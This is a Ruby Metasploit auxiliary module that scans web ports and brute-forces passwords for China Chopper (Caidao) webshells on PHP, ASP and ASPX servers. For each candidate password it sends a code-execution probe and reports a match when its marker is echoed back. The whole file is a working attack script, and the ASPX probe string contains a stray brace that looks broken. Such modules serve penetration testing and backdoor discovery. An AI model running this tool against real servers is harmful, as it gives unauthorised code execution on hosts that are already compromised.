##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chinese Caidao Backdoor Bruteforce',
      'Description'    => 'This module attempts to brute chinese caidao php/asp/aspx backdoor.',
      'Author'         => [ 'Nixawk' ],
      'References'     => [
              [ 'URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptEnum.new('TYPE', [ true, "backdoor type", "PHP", ["PHP", "ASP", "ASPX"] ]),
      OptString.new('TARGETURI', [ true, "The URI to authenticate against", "/backdoor.php" ])
    ], self.class)

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
  end

  def backdoor_brute(uri, user, pass, payload, match)
    begin
      data = "&user=#{user}&#{pass}=#{payload}"
      res = send_request_cgi({
          'uri'          =>  uri,
          'method'       =>  "POST",
          'data'         =>  "#{data}"
      })

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEOUT
      print_error("#{peer} - Service failed to respond")
      return :abort

    end

    print_status("#{peer} - brute force caidao password: \"#{pass}\"")

    if res and res.code == 200 and res.body =~ /#{match}/mi
        print_good("#{peer} - Successful login: password - \"#{pass}\"")

        return :next_user
    end

    return
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    script_type = datastore['TYPE']

    junk = Rex::Text::rand_text_alphanumeric(4)
    match = "#{junk}4#{junk}"

    case script_type
    when /php$/mi
      payload = "$_=\"4\";echo \"#{junk}\".$_.\"#{junk}\";";

    when /asp$/mi
      payload = "execute(\"response.write(\"\"#{junk}\"\"):response.write(Len(\"\"#{junk}\"\")):response.write(\"\"#{junk}\"\"):response.end\")"

    when /aspx$/mi
      payload = "Response.Write(\"#{junk}\");Response.Write(Len(\"#{junk}\")});Response.Write(\"#{junk}\")"

    else
      print_error("#{peer} - Backddor type is not support")
      return
    end

    each_user_pass { |user, pass|
      backdoor_brute(uri, user, pass, payload, match)
    }
  end
end
